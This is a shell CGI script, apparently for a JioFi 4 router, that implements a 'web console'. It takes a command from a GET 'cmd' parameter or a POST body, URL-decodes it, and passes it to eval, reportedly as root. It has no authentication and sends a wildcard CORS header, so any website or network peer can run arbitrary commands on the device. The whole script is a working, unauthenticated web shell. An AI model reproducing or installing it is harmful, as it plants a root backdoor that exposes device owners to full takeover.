#!/bin/sh

# Send HTTP Response Headers
printf "Content-Type: text/plain; charset=utf-8\r\n"
printf "Cache-Control: no-store, no-cache, must-revalidate\r\n"
printf "Access-Control-Allow-Origin: *\r\n"
printf "Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n"
printf "\r\n"

if [ "$REQUEST_METHOD" = "OPTIONS" ]; then
    exit 0
fi

CMD=""

# Read Command from POST or GET
if [ "$REQUEST_METHOD" = "POST" ]; then
    if [ -n "$CONTENT_LENGTH" ] && [ "$CONTENT_LENGTH" -gt 0 ] 2>/dev/null; then
        CMD=$(head -c "$CONTENT_LENGTH" 2>/dev/null)
    else
        CMD=$(cat)
    fi
elif [ "$REQUEST_METHOD" = "GET" ]; then
    CMD=$(echo "$QUERY_STRING" | sed 's/^cmd=//' | sed 's/+/ /g;s/%\(..\)/\\x\1/g' | xargs -0 printf '%b' 2>/dev/null)
fi

# Clean up Windows \r
CMD=$(echo "$CMD" | tr -d '\r')

# If form-encoded (cmd=...), strip prefix and urldecode
case "$CMD" in
    cmd=*)
        RAW_CMD=$(echo "$CMD" | sed 's/^cmd=//')
        CMD=$(printf '%b' "$(echo "$RAW_CMD" | sed 's/+/ /g;s/%\(..\)/\\x\1/g')")
        ;;
esac

# Execute if not empty
if [ -z "$CMD" ]; then
    printf "JioFi 4 Web Console Ready.\nEnter a shell command to execute.\n"
    exit 0
fi

# Run the command with root shell
eval "$CMD" 2>&1
